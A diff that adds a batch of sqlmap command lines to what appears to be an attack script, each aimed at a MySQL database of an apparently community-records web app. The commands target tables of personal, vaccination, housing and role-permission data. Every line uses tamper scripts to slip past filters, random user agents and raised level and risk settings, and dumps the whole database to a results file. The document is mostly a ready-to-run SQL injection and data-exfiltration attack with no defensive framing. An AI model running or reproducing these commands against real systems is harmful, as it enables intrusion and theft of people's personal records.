@@ -40,5 +40,23 @@ sqlmap.py -m ./urls/Notificaciones.txt --batch -D "b5_33489354_conco" --dbms=mys
 
 sqlmap.py -m ./urls/Parto_Humanizado.txt --batch -D "b5_33489354_conco" --dbms=mysql --level=2 --risk=2 --tamper=space2comment --random-agent --data="cedula_usuario=7654321&contrasenia=clave" --cookie="PHPSESSID=1234567890abcdef" --dump-all --method=GET,POST -T parto_humanizado -o ./resultados/resultados.txt --threads=10
 
-++
+
 sqlmap.py -m ./urls/Personas.txt --batch -D "b5_33489354_conco" --dbms=mysql --level=2 --risk=2 --tamper=space2comment --random-agent --data="cedula_usuario=7654321&contrasenia=clave" --cookie="PHPSESSID=1234567890abcdef" --dump-all --method=GET,POST -T personas -o ./resultados/resultados.txt --threads=10
+
+
+sqlmap.py -m ./urls/Reportes.txt --batch -D "b5_33489354_conco" --dbms=mysql --level=2 --risk=2 --tamper=space2comment --random-agent --data="cedula_usuario=7654321&contrasenia=clave" --cookie="PHPSESSID=1234567890abcdef" --dump-all --method=GET,POST --tables -o ./resultados/resultados.txt --threads=10
+
+
+sqlmap.py -m ./urls/Sector_Agricola.txt --batch -D "b5_33489354_conco" --dbms=mysql --level=2 --risk=2 --tamper=space2comment --random-agent --data="cedula_usuario=7654321&contrasenia=clave" --cookie="PHPSESSID=1234567890abcdef" --dump-all --method=GET,POST -T sector_agricola -o ./resultados/resultados.txt --threads=10
+
+
+sqlmap.py -m ./urls/Seguridad.txt --batch -D "b5_33489354_conco" --dbms=mysql --level=2 --risk=2 --tamper=space2comment --random-agent --data="cedula_usuario=7654321&contrasenia=clave" --cookie="PHPSESSID=1234567890abcdef" --dump-all --method=GET,POST -T roles_permisos_modulo -o ./resultados/resultados.txt --threads=10
+
+
+sqlmap.py -m ./urls/Solicitudes.txt --batch -D "b5_33489354_conco" --dbms=mysql --level=2 --risk=2 --tamper=space2comment --random-agent --data="cedula_usuario=7654321&contrasenia=clave" --cookie="PHPSESSID=1234567890abcdef" --dump-all --method=GET,POST -T solicitudes -o ./resultados/resultados.txt --threads=10
+
+
+sqlmap.py -m ./urls/Vacunados.txt --batch -D "b5_33489354_conco" --dbms=mysql --level=2 --risk=2 --tamper=space2comment --random-agent --data="cedula_usuario=7654321&contrasenia=clave" --cookie="PHPSESSID=1234567890abcdef" --dump-all --method=GET,POST -T vacuna_covid -o ./resultados/resultados.txt --threads=10
+
+
+sqlmap.py -m ./urls/Viviendas.txt --batch -D "b5_33489354_conco" --dbms=mysql --level=2 --risk=2 --tamper=space2comment --random-agent --data="cedula_usuario=7654321&contrasenia=clave" --cookie="PHPSESSID=1234567890abcdef" --dump-all --method=GET,POST -T vivienda -o ./resultados/resultados.txt --threads=10
